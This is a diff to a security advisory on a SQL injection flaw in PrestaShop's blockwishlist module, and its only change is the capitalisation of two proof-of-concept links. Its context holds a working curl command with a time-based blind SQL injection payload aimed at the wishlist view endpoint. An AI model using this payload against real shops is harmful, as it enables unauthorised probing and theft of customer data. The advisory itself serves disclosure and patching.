@@ -48,7 +48,7 @@ Remove all data of the linked PrestaShop
 
 ## Proof of concept
 
-Based on this [POC](https://packetstormsecurity.com/files/168003/Prestashop-Blockwishlist-2.1.0-SQL-Injection.html)
+Based on this [POC](https://packetstormsecurity.com/files/168003/PrestaShop-Blockwishlist-2.1.0-SQL-Injection.html)
 
 ```bash
 curl -v 'http://website.com/module/blockwishlist/view?id_wishlist=1&order=product.name%2C%20%28select%20case%20when%20%28id_customer%3D1%29%20then%20%28SELECT%20SLEEP%287%29%29%20else%201%20end%20from%20ps_customer%20where%20id_customer%3D1%29%3B%20--.asc'
@@ -97,6 +97,6 @@ Please note, blockwishlist is often forked to be customized.
 ## Links
 
 * [PrestaShop product repository](https://github.com/PrestaShop/blockwishlist/security/advisories/GHSA-2jx3-5j9v-prpp)
-* [POC](http://packetstormsecurity.com/files/168003/Prestashop-Blockwishlist-2.1.0-SQL-Injection.html)
+* [POC](http://packetstormsecurity.com/files/168003/PrestaShop-Blockwishlist-2.1.0-SQL-Injection.html)
 * [Patch](https://github.com/PrestaShop/blockwishlist/commit/b3ec4b85af5fd73f74d55390b226d221298ca084)
 
